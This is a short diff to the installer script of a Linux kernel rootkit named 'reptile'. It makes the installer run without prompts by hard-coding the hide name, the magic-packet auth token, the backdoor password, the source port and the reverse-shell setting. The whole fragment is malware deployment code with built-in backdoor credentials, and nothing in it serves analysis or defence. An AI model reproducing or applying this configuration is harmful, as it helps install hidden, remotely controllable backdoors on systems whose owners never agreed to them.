@@ -116,23 +116,23 @@ function random_gen {
 
 #SB: Modify function to install non-interactively
 function config_gen {
-	load_config "Hide name (will be used to hide dirs/files)" "reptile"
+	#load_config "Hide name (will be used to hide dirs/files)" "reptile"
 	MODULE="reptile"
 	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 
-	load_config "Auth token to magic packets" "hax0r"
+	#load_config "Auth token to magic packets" "hax0r"
 	TOKEN="hax0r"
 
-	load_config "Backdoor password" "s3cr3t"
+	#load_config "Backdoor password" "s3cr3t"
 	PASS="s3cr3t"
 
-	load_config "Tag name that hide file contents" "reptile"
+	#load_config "Tag name that hide file contents" "reptile"
 	TAG="reptile"
 
-	load_config "Source port of magic packets" "666"
+	#load_config "Source port of magic packets" "666"
 	SRCPORT="666"
 
-	load_config "Would you like to config reverse shell each X time? (y/n)" "n"
+	#load_config "Would you like to config reverse shell each X time? (y/n)" "n"
 	RSH="n"
 
 	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
